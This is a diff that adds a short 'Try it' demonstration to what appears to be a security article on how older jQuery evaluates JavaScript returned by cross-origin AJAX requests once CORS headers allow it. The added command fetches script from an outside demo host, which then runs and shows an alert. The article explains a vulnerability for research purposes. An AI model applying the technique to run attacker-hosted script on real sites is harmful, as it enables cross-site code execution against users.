@@ -25,6 +25,12 @@ In order to exploit this we need to trigger a AJAX request to a JavaScript file 
 
 However, with the introduction of [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS) it is possible to selectively disable the same-origin policy. This opt-in policy only allows whitelisted domains to do cross-origin requests. However, the attacker's site with his malicious script can opt-in and allow a cross-site request from the site doing the AJAX request. This means that the same-origin policy no longer protects against cross-site script execution.
 
+**Try it:** Open [a site with an old version of jQuery](http://jquery.com/), and type the following in the browser console:
+
+    jQuery.get('http://demo.sjoerdlangkemper.nl/cors.php')
+
+[That URL](http://demo.sjoerdlangkemper.nl/cors.php) will return JavaScript using the correct content type and CORS headers. jQuery will immediately evaluate the JavaScript and show an alert.
+
 ## Same-origin mitigation
 
 PrototypeJS was one of the libraries that evaluated any JavaScript returned in AJAX responses. If the content-type of the response was application/json, it would be evaluated. This changed in 2008 in Prototype 1.6.0.2:
